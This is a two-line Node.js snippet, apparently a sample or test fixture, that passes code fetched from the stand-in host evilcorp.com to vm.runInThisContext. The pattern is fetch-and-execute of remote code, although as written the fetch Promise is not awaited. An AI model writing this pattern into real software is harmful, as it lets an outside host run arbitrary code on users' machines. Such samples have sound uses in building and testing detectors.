const myVM = require('node:vm');
myVM.runInThisContext(fetch('http://evilcorp.com/hacky-hacky'));
